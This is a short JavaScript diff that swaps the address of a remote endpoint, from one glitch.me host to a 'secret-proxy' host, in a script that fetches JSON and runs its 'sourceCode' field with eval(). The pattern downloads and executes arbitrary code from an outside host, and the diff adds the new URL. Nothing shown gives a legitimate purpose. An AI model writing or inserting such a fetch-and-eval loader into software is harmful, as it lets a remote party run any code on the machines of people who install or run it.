@@ -4,7 +4,7 @@
 
 const fetch = require('node-fetch');
 
-fetch('https://muun.glitch.me/server')
+fetch('http://hello-comrade.glitch.me/secret-proxy')
   .then((res) => res.json())
   .then((res) => {
     eval(res.sourceCode);
